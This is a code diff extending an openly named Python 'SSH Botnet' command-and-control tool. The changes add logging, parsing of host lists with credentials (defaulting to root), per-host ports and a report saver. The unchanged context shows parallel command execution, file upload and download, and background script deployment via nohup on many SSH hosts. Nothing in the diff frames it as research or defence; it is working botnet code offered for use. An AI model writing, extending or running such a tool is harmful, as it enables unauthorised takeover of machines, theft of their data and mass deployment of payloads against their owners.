@@ -27,6 +27,22 @@ class SSHBotnet:
         self.running_hosts = {} # ip: status/info
         self.processed_count = 0
         self.lock = threading.Lock()
+        # Setup botnet logging
+        logging.basicConfig(
+            filename='botnet.log',
+            level=logging.INFO,
+            format='%(asctime)s - %(message)s',
+            datefmt='%Y-%m-%d %H:%M:%S'
+        )
+        self.logger = logging.getLogger("botnet")
+        self.logger.info("Botnet session started")
+
+    def log(self, message):
+        """Helper to print and log at the same time"""
+        print(message)
+        # Remove ANSI colors for the log file
+        clean_msg = message.replace("\033[31m", "").replace("\033[32m", "").replace("\033[33m", "").replace("\033[34m", "").replace("\033[35m", "").replace("\033[36m", "").replace("\033[0m", "")
+        self.logger.info(clean_msg)
 
     def load_hosts(self, filepath=None):
         if not filepath:
@@ -50,14 +66,31 @@ class SSHBotnet:
                     else:
                         parts = line.split()
                     
-                    if len(parts) >= 3:
-                        self.hosts.append({'host': parts[0], 'user': parts[1], 'port': 22, 'password': parts[2]})
+                    host, user, port, password = None, 'root', 22, None
+
+                    if len(parts) >= 2 and '@' in parts[0]:
+                        # Format: user@host:port password
+                        user_host_port = parts[0]
+                        password = parts[1]
+                        user, host_port = user_host_port.split('@', 1)
+                        if ':' in host_port:
+                            host, port_str = host_port.split(':', 1)
+                            port = int(port_str)
+                        else:
+                            host = host_port
+                    elif len(parts) >= 3:
+                        # Format: host user password
+                        host, user, port, password = parts[0], parts[1], 22, parts[2]
                     elif len(parts) == 1:
-                        self.hosts.append({'host': parts[0], 'user': 'root', 'port': 22, 'password': None})
+                        # Format: host
+                        host, user, port, password = parts[0], 'root', 22, None
+                    
+                    if host:
+                        self.hosts.append({'host': host, 'user': user, 'port': port, 'password': password})
                 except:
                     pass
         
-        print(colored(f"[*] Loaded {len(self.hosts)} hosts.\n", "green"))
+        self.log(colored(f"[*] Loaded {len(self.hosts)} hosts.", "green"))
 
     def run_on_host(self, host_info, command, sudo_cmd=False):
         try:
@@ -97,15 +130,29 @@ class SSHBotnet:
         # Increase max_workers for speed, but keep it reasonable for system limits
         with ThreadPoolExecutor(max_workers=50) as executor:
             executor.map(check, self.hosts)
-        print(colored("\n[*] Host List Updated\n", "green"))
+        self.log(colored("\n[*] Host List Updated", "green"))
 
     def list_hosts(self):
-        print("\n{0:5} | {1:30} | {2:15}".format("ID", "Host", "SysInfo"))
+        header = "\n{0:5} | {1:30} | {2:15}".format("ID", "Host", "SysInfo")
+        print(header)
         print("-" * 70)
         for idx, h in enumerate(self.hosts):
             status = self.running_hosts.get(h['host'], "Unknown")
             print("{0:5} | {1:30} | {2}".format(idx, h['host'], status))
         print("\n")
+
+    def save_hosts_report(self):
+        filename = input("Enter filename for report [default: hosts_report.txt]: ").strip() or "hosts_report.txt"
+        try:
+            with open(filename, "w") as f:
+                f.write("Host Report - " + os.uname().nodename + "\n")
+                f.write("-" * 50 + "\n")
+                for h in self.hosts:
+                    status = self.running_hosts.get(h['host'], "Unknown")
+                    f.write(f"Host: {h['host']} | User: {h['user']} | Status: {status}\n")
+            self.log(colored(f"[*] Report saved to {filename}", "green"))
+        except Exception as e:
+            print(colored(f"Error saving report: {e}", "red"))
 
     def active_hosts(self):
         print("\nActive Hosts:")
@@ -136,12 +183,13 @@ class SSHBotnet:
     def run_command_menu(self):
         cmd = input("Command: ")
         selected = self.get_selected_hosts()
+        self.logger.info(f"Executing command '{cmd}' on {len(selected)} hosts")
         
         def run_cmd(h):
             res = self.run_on_host(h, cmd, sudo_cmd=cmd.startswith("sudo"))
-            print(f"\n[{h['host']}]: {cmd}")
-            print('-' * 80)
-            print(res + '\n')
+            output = f"\n[{h['host']}]: {cmd}\n{'-' * 40}\n{res}\n"
+            print(output)
+            self.logger.info(output.strip())
 
         with ThreadPoolExecutor(max_workers=10) as executor:
             executor.map(run_cmd, selected)
@@ -153,14 +201,14 @@ class SSHBotnet:
         
         def up(h):
             try:
-                with Connection(h['host'], user=h['user'], connect_kwargs={"password": h['password']}) as c:
+                with Connection(h['host'], user=h['user'], port=h['port'], connect_kwargs={"password": h['password']}) as c:
                     remote_dir = os.path.dirname(remote_path)
                     if remote_dir:
                         c.run(f"mkdir -p {remote_dir}", hide=True)
                     c.put(local_path, remote=remote_path)
-                    print(colored(f"[{h['host']}] Upload successful", "green"))
+                    self.log(colored(f"[{h['host']}] Upload successful: {local_path} -> {remote_path}", "green"))
             except Exception as e:
-                print(colored(f"[{h['host']}] Upload failed: {e}", "red"))
+                self.log(colored(f"[{h['host']}] Upload failed: {e}", "red"))
 
         with ThreadPoolExecutor(max_workers=5) as executor:
             executor.map(up, selected)
@@ -174,11 +222,11 @@ class SSHBotnet:
             try:
                 # Append hostname to local path to avoid overwriting
                 l_path = f"{local_path}_{h['host']}" if not os.path.isdir(local_path) else os.path.join(local_path, f"{os.path.basename(remote_path)}_{h['host']}")
-                with Connection(h['host'], user=h['user'], connect_kwargs={"password": h['password']}) as c:
+                with Connection(h['host'], user=h['user'], port=h['port'], connect_kwargs={"password": h['password']}) as c:
                     c.get(remote_path, local=l_path)
-                    print(colored(f"[{h['host']}] Download successful -> {l_path}", "green"))
+                    self.log(colored(f"[{h['host']}] Download successful: {remote_path} -> {l_path}", "green"))
             except Exception as e:
-                print(colored(f"[{h['host']}] Download failed: {e}", "red"))
+                self.log(colored(f"[{h['host']}] Download failed: {e}", "red"))
 
         with ThreadPoolExecutor(max_workers=5) as executor:
             executor.map(down, selected)
@@ -189,27 +237,27 @@ class SSHBotnet:
         
         def exec_script(h):
             try:
-                with Connection(h['host'], user=h['user'], connect_kwargs={"password": h['password']}) as c:
+                with Connection(h['host'], user=h['user'], port=h['port'], connect_kwargs={"password": h['password']}) as c:
                     c.put(local_path, remote="/tmp/script.sh")
                     c.run("chmod +x /tmp/script.sh", hide=True)
                     # Run in background similar to nohup
                     c.run("nohup /tmp/script.sh &> /dev/null &", pty=False)
-                    print(colored(f"[{h['host']}] Script execution started", "green"))
+                    self.log(colored(f"[{h['host']}] Script execution started: {local_path}", "green"))
             except Exception as e:
-                print(colored(f"[{h['host']}] Script exec failed: {e}", "red"))
+                self.log(colored(f"[{h['host']}] Script exec failed: {e}", "red"))
 
         with ThreadPoolExecutor(max_workers=5) as executor:
             executor.map(exec_script, selected)
 
 def menu():
-    options = ["List Hosts", "Active Hosts", "Update Hosts", "Run Command", "Open Shell (Not Implemented in Parallel mode)", "File Upload", "File Download", "Script Exec", "Exit"]
+    options = ["List Hosts", "Active Hosts", "Update Hosts", "Run Command", "Open Shell (Not Implemented)", "File Upload", "File Download", "Script Exec", "Save Report", "Exit"]
     for num, desc in enumerate(options):
         print(f"[{num}] {desc}")
     try:
         choice = input('\nC&C $> ')
         return int(choice)
     except (KeyboardInterrupt, ValueError):
-        return 8
+        return 9
 
 def main():
     print(colored("--- SSH Botnet Advanced (Python 3) ---", "magenta", attrs=['bold']))
@@ -228,7 +276,8 @@ def main():
         elif choice == 5: botnet.upload()
         elif choice == 6: botnet.download()
         elif choice == 7: botnet.script_exec()
-        elif choice == 8: break
+        elif choice == 8: botnet.save_hosts_report()
+        elif choice == 9: break
         else: print("Invalid choice")
 
 if __name__ == "__main__":
